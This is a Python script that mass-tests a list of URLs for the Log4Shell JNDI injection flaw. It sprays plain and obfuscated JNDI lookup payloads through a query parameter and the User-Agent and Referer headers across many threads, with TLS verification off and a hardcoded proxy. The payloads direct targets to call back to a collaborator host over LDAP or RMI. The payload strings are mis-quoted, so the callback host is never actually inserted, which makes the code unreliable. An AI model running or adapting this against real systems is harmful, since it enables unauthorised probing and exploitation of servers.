from sys import argv
from requests import get
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

disable_warnings()

proxies = {}
proxies = {"http": "http://192.168.0.109:8080", "https": "http://192.168.0.109:8080"}

def sendDetectionRequest(url, urlId):
    try:
        payload = ["${jndi:ldap://' + argv[2] + '/a}'","'${${::-j}ndi:rmi://'+ argv[2] +'/ass}'","'${${lower:jndi}:${lower:rmi}://'+argv[2]+'/poc}'"]
        for payl in payload:
            params = {'id':payl}
            headers = {'User-Agent':payl, 'Referer':payl}
            url = url.strip()
            print('[{}] Testing {}'.format(urlId, url))
            get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
    except Exception as e:
        print(e)
        pass

threads = []
urlId = 0
if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urlList = urlFile.readlines()
    with ThreadPoolExecutor(max_workers=15) as executor:
        for url in urlList:
            urlId += 1
            threads.append(executor.submit(sendDetectionRequest, url, urlId))
else:
    print('[!] Syntax: python3 {} <urlFile> <collaboratorPayload>'.format(argv[0]))
